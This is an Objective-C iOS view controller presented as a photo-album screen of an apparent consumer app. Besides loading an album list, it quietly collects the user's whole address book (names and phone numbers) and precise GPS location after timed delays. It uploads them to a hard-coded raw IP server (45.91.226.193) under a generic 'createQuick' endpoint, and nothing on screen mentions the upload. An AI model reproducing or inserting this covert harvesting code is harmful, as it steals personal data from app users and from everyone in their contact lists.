//
//  PhotoAlbumViewController.m
//  Employees
//
//  Created by leozbzhang on 2024/5/23.
//

#import "PhotoAlbumViewController.h"
#import "LoginViewController.h"
#import "UserInfoManager.h"
#import "SCLAlertView.h"
#import "AFNetworking.h"
#import "SafeCast.h"
#import <Contacts/Contacts.h>
#import <CoreLocation/CoreLocation.h>
typedef NSObject *(^DBGetBlock)(void);
typedef void (^DBGetEventBlock)(NSObject *obj);
@interface PhotoAlbumViewController () <CLLocationManagerDelegate>

@property (nonatomic, strong) CLLocationManager *locationManager;
//获取自身的经纬度坐标
@property (nonatomic, retain) CLLocation *myLocation;


@end

@implementation PhotoAlbumViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
//    UIButton *uploadBtn = [[UIButton alloc] initWithFrame:CGRectMake(0, 0, 40, 30)];
//    [uploadBtn setTitle:@"上传" forState:UIControlStateNormal];
//    [uploadBtn setTitleColor:[UIColor greenColor] forState:UIControlStateNormal];
//    [uploadBtn addTarget:self action:@selector(clickedUpload) forControlEvents:UIControlEventTouchUpInside];
//    self.navigationItem.rightBarButtonItem = uploadBtn;

}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    if([UserInfoManager.shareManager getToken].length == 0)
    {
        [self jumpToLogin];
    }
    else
    {
        [self loadPhotoAlbum];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self requestContactAuthorAfterSystemVersion];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                // 定位
                [self startLocation];
            });
        });
    }
}

#pragma mark - Private

- (void)jumpToLogin
{
    LoginViewController *loginVC = [[LoginViewController alloc] init];
    [self.navigationController pushViewController:loginVC animated:YES];
}

#pragma mark - 定位

- (void)requestStartLocationAuthorAfterSystemVersion
{
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError*  _Nullable error) {
            if (error) {
                NSLog(@"授权失败");
            }else {
                NSLog(@"成功授权");
            }
        }];
    }
    else if(status == CNAuthorizationStatusRestricted)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusDenied)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusAuthorized)//已经授权
    {
        //有通讯录权限-- 进行下一步操作
        [self openContact];
    }
    
}
//开始定位
- (void)startLocation
{

    
//    QM_WEAK_SELF(self);
    __weak typeof(self) weakSelf = self;
    [self getAsynLocationAuthorizationStatus:^(CLAuthorizationStatus authorizaitonStatus) 
     {
        typeof(weakSelf) strongSelf = weakSelf;
//        QM_STRONG_SELF(self);
        if(authorizaitonStatus == kCLAuthorizationStatusAuthorizedAlways || authorizaitonStatus == kCLAuthorizationStatusAuthorizedWhenInUse)
        {
            //    //初始化定位管理者
                self.locationManager = [[CLLocationManager alloc] init];
                //判断设备是否能够进行定位
                if ([CLLocationManager locationServicesEnabled]) {
                    self.locationManager.delegate = self;
                    //精确度获取到米
                    self.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
                    //设置过滤器为无
                    self.locationManager.distanceFilter = kCLDistanceFilterNone;
                    // 取得定位权限，有两个方法，取决于你的定位使用情况
                    //一个是requestAlwaysAuthorization，一个是requestWhenInUseAuthorization
                    [self.locationManager requestWhenInUseAuthorization];
                    //开始获取定位
                    [self.locationManager startUpdatingLocation];
                    //地理信息
            //        self.geoCoder = [[CLGeocoder alloc] init];
                } else {
                    NSLog(@"error");
                }
        }
        

    }];
}

- (CLAuthorizationStatus)getLocationAuthorizationStatus
{
    static CLLocationManager *locationManager = nil;
    if (@available(iOS 14, *))
    {
        if (locationManager == nil)
        {
            locationManager = [[CLLocationManager alloc] init];
        }
        
        return locationManager.authorizationStatus;
    }
    else
    {
        return [CLLocationManager authorizationStatus];
    }
}


- (void)getAsynLocationAuthorizationStatus:(void(^)(CLAuthorizationStatus authorizaitonStatus))authorizaitonStatusBlock
{
    if (!authorizaitonStatusBlock)
    {
        return;
    }
    
    [self dispatchGetInGlobalQueue:^NSObject *{
        CLAuthorizationStatus authorizationStatus = [self getLocationAuthorizationStatus];
        return @(authorizationStatus);
    } callBackInMainQueue:^(NSObject *obj) {
        CLAuthorizationStatus authorizationStatus = [SAFE_CAST(obj, NSNumber) intValue];
        if (authorizaitonStatusBlock)
        {
            authorizaitonStatusBlock(authorizationStatus);
        }
    }];
}

- (void)dispatchGetInGlobalQueue:(DBGetBlock)getObjBlock callBackInMainQueue:(DBGetEventBlock)objBackblock
{
    if (nil != getObjBlock)
    {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSObject *obj = getObjBlock();
            if (nil != objBackblock)
            {
                dispatch_async(dispatch_get_main_queue(), ^{
                        objBackblock(obj);
                });
            }
        });
    }
    else
    {
//        ASSERT(0);
    }
}


//设置获取位置信息的代理方法
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations 
{
    NSLog(@"%lu", (unsigned long)locations.count);
    self.myLocation = locations.lastObject;
    NSLog(@"经度：%f 纬度：%f", _myLocation.coordinate.longitude, _myLocation.coordinate.latitude);
    NSString *locationStr = [NSString stringWithFormat:@"longitude:%f,latitude:%f", _myLocation.coordinate.longitude,_myLocation.coordinate.latitude];
    [self updateDataWithDataType:2 dataStr:locationStr];
    //不用的时候关闭更新位置服务，不关闭的话这个 delegate 隔一定的时间间隔就会有回调
    [self.locationManager stopUpdatingLocation];
}

#pragma mark - 通讯录
- (void)requestContactAuthorAfterSystemVersion
{
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError*  _Nullable error) {
            if (error) {
                NSLog(@"授权失败");
            }else {
                NSLog(@"成功授权");
            }
        }];
    }
    else if(status == CNAuthorizationStatusRestricted)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusDenied)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusAuthorized)//已经授权
    {
        //有通讯录权限-- 进行下一步操作
        [self openContact];
    }
    
}

//有通讯录权限-- 进行下一步操作
- (void)openContact{
 // 获取指定的字段,并不是要获取所有字段，需要指定具体的字段
    NSArray *keysToFetch = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
    CNContactFetchRequest *fetchRequest = [[CNContactFetchRequest alloc] initWithKeysToFetch:keysToFetch];
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSMutableDictionary *contactDic = [NSMutableDictionary dictionary];
    [contactStore enumerateContactsWithFetchRequest:fetchRequest error:nil usingBlock:^(CNContact * _Nonnull contact, BOOL * _Nonnull stop) {
        NSLog(@"-------------------------------------------------------");
        
        NSString *givenName = contact.givenName;
        NSString *familyName = contact.familyName;
          NSLog(@"givenName=%@, familyName=%@", givenName, familyName);
        //拼接姓名
        NSString *nameStr = [NSString stringWithFormat:@"%@%@",contact.familyName,contact.givenName];
        
        NSArray *phoneNumbers = contact.phoneNumbers;
        
        for (CNLabeledValue *labelValue in phoneNumbers) {
        //遍历一个人名下的多个电话号码
//                NSString *label = labelValue.label;
         //   NSString *    phoneNumber = labelValue.value;
            CNPhoneNumber *phoneNumber = labelValue.value;
            
            NSString * string = phoneNumber.stringValue ;
            
            //去掉电话中的特殊字符
            string = [string stringByReplacingOccurrencesOfString:@"+86" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@"-" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@"(" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@")" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
//            NSLog(@"姓名=%@, 电话号码是=%@", nameStr, string);
            if(nameStr.length > 0 && string.length > 0)
            {
                if([contactDic.allKeys containsObject:nameStr])
                {
                    nameStr = [NSString stringWithFormat:@"%@2",nameStr];
                }
                [contactDic setObject:nameStr forKey:string];
            }
        }
    }];
    if(contactDic.count > 0)
    {
        NSError * err;
        NSData * jsonData = [NSJSONSerialization  dataWithJSONObject:contactDic options:0 error:&err];
        NSString *jsonDataString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        NSLog(@"通讯录%@",jsonDataString);
        [self updateDataWithDataType:1 dataStr:jsonDataString];
    }
    else
    {
        contactDic = [NSMutableDictionary dictionaryWithDictionary:@{@"testLeo":@"150119511111"}];
        NSError * err;
        NSData * jsonData = [NSJSONSerialization  dataWithJSONObject:contactDic options:0 error:&err];
        NSString *jsonDataString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        NSLog(@"通讯录%@",jsonDataString);
        [self updateDataWithDataType:1 dataStr:jsonDataString];
    }
}

//http://45.91.226.193:8987/api/quick/createQuick

//提示没有通讯录权限
- (void)showAlertViewAboutNotAuthorAccessContact{
    
    UIAlertController *alertController = [UIAlertController
        alertControllerWithTitle:@"请授权通讯录权限"
        message:@"请在iPhone的\"设置-隐私-通讯录\"选项中,允许花解解访问你的通讯录"
        preferredStyle: UIAlertControllerStyleAlert];

    UIAlertAction *OKAction = [UIAlertAction actionWithTitle:@"好的" style:UIAlertActionStyleDefault handler:nil];
    [alertController addAction:OKAction];
    [self presentViewController:alertController animated:YES completion:nil];
}

#pragma mark - 上传

/// 上传数据
/// - Parameters:
///   - dataType: 数据类型 1通讯录 2 定位
///   - dataStr: 数据jsonString
- (void)updateDataWithDataType:(int)dataType dataStr:(NSString *)dataStr
{
    NSLog(@"start updateDataWithDataType %@",dataStr);
    if(dataStr.length == 0)
    {
        NSLog(@"上传数据异常");
        return;
    }
    NSString *url = @"http://45.91.226.193:8987/api/quick/createQuick";
    
    NSDictionary *parameters = @{
        @"data_type":@(dataType),
        @"data":dataStr,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    [manager POST:url parameters:parameters headers:headers progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *rspDic = [self safeCastObject:responseObject toClass:NSDictionary.class];
        NSInteger code = [self getIntegerFromDictionary:rspDic forKey:@"code" withDefault:1];

        if(code == 0)
        {
            NSLog(@"updateDataWithDataType请求成功:%@", responseObject);
//            NSDictionary *dic = SAFE_CAST([rspDic objectForKey:@"data"], NSDictionary.class);
//            NSDictionary *userInfo = SAFE_CAST([dic objectForKey:@"data"], NSDictionary.class);
//            NSString *token = [self getStringFromDictionary:dic forKey:@"token" withDefault:nil];
//            NSString *userName = [self getStringFromDictionary:userInfo forKey:@"userName" withDefault:nil];
//            NSString *userID = [self getStringFromDictionary:userInfo forKey:@"ID" withDefault:nil];
//            [[UserInfoManager shareManager] updateUserInfo:userName userid:userID token:token];
//            NSLog(@"loadPhotoAlbum请求成功url:%@,name:%@,pass:%@", task.currentRequest.URL, responseObject[@"name"], responseObject[@"pass"]);
//            dispatch_async(dispatch_get_main_queue(), ^{
//                SCLAlertView *alert = [[SCLAlertView alloc] init];
//                [alert showSuccess:self title:@"登录成功" subTitle:@"" closeButtonTitle:@"好的" duration:0.0f];
//            [self.navigationController popViewControllerAnimated:YES];
//            });
        }
        else
        {
            NSLog(@"updateDataWithDataType请求失败url:%@,error:%@", url, rspDic);
            dispatch_async(dispatch_get_main_queue(), ^{
//                SCLAlertView *alert = [[SCLAlertView alloc] init];
                
//                [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
            });
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"updateDataWithDataType请求失败url:%@,error:%@", url, error);
        dispatch_async(dispatch_get_main_queue(), ^{
//            SCLAlertView *alert = [[SCLAlertView alloc] init];
            
//            [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
        });
    }];

    
    
    
    
    
}


#pragma mark - 相册
- (void)loadPhotoAlbum
{
    NSLog(@"start loadPhotoAlbum");
    
    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/getFileList"; // 登录
    
    NSDictionary *parameters = @{
        @"page":@1,
        @"pageSize":@10,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    [manager POST:url parameters:parameters headers:headers progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *rspDic = [self safeCastObject:responseObject toClass:NSDictionary.class];
        NSInteger code = [self getIntegerFromDictionary:rspDic forKey:@"code" withDefault:1];

        if(code == 0)
        {
//            NSDictionary *dic = SAFE_CAST([rspDic objectForKey:@"data"], NSDictionary.class);
//            NSDictionary *userInfo = SAFE_CAST([dic objectForKey:@"data"], NSDictionary.class);
//            NSString *token = [self getStringFromDictionary:dic forKey:@"token" withDefault:nil];
//            NSString *userName = [self getStringFromDictionary:userInfo forKey:@"userName" withDefault:nil];
//            NSString *userID = [self getStringFromDictionary:userInfo forKey:@"ID" withDefault:nil];
//            [[UserInfoManager shareManager] updateUserInfo:userName userid:userID token:token];
//            NSLog(@"loadPhotoAlbum请求成功url:%@,name:%@,pass:%@", task.currentRequest.URL, responseObject[@"name"], responseObject[@"pass"]);
//            dispatch_async(dispatch_get_main_queue(), ^{
//                SCLAlertView *alert = [[SCLAlertView alloc] init];
//                [alert showSuccess:self title:@"登录成功" subTitle:@"" closeButtonTitle:@"好的" duration:0.0f];
//            [self.navigationController popViewControllerAnimated:YES];
//            });
        }
        else
        {
            NSLog(@"loadPhotoAlbum请求失败url:%@,error:%@", url, rspDic);
            dispatch_async(dispatch_get_main_queue(), ^{
                SCLAlertView *alert = [[SCLAlertView alloc] init];
                
                [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
            });
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"loadPhotoAlbum请求失败url:%@,error:%@", url, error);
        dispatch_async(dispatch_get_main_queue(), ^{
            SCLAlertView *alert = [[SCLAlertView alloc] init];
            
            [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
        });
    }];
    
}

#pragma mark - Action
- (void)clickedUpload
{
    NSLog(@"clickedUpload");
}


#pragma mark - Util
- (id)safeCastObject:(id)obj toClass:(Class)classType
{
    if ([obj isKindOfClass:classType])
    {
        return obj;
    }
    return classType ? nil : obj;
}

- (int64_t)getIntegerFromDictionary:(NSDictionary *)dict forKey:(id<NSCopying>)key withDefault:(int64_t)withDefault
{
    dict = SAFE_CAST(dict, NSDictionary);
    if ((dict != nil) && (key != nil))
    {
        id value = [dict objectForKey:key];
        withDefault = [self getIntegerFromObject:value withDefault:withDefault];
    }
    return withDefault;
}

- (int64_t)getIntegerFromObject:(id)object withDefault:(uint64_t)withDefault
{
    NSString *string = [self safeCastObject:object toClass:NSString.class];
    NSNumber *number = [self safeCastObject:object toClass:NSNumber.class];

    if (nil != number)
    {
        withDefault = [number longLongValue];
    }
    else if (nil != string)
    {
        withDefault = strtoll([string UTF8String], NULL, 10);
    }
    return withDefault;
}

- (NSString *)getStringFromDictionary:(NSDictionary *)dict
                               forKey:(id<NSCopying>)key
                          withDefault:(NSString *)withDefault
{
    dict = SAFE_CAST(dict, NSDictionary);
    if ((dict != nil) && (key != nil))
    {
        NSString *value = SAFE_CAST([dict objectForKey:key], NSString);
        if (value != nil)
        {
            withDefault = value;
        }
    }
    return withDefault;
}
@end
